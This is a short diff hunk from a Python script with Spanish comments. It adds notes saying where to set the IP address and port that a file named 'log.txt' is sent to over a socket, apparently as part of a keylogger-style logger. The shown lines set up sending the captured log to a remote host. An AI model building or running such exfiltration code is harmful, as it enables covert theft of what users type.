@@ -48,8 +48,8 @@ def Stop_script():
     send_data(file_path, dir_ip, port_num)
 
 #Envio de datos mediante socket 
-dir_ip = "0.0.0.0"
-port_num = 0
+dir_ip = "0.0.0.0"  #<=Aqui se debe colocar la direccion IP a donde se va enviar los datos
+port_num = 0       #<=Aqui se debe colocar el puerto a donde se va enviar los datos
 file_path = "log.txt"
 
 #Actualizar la variable word a una cadena vacía
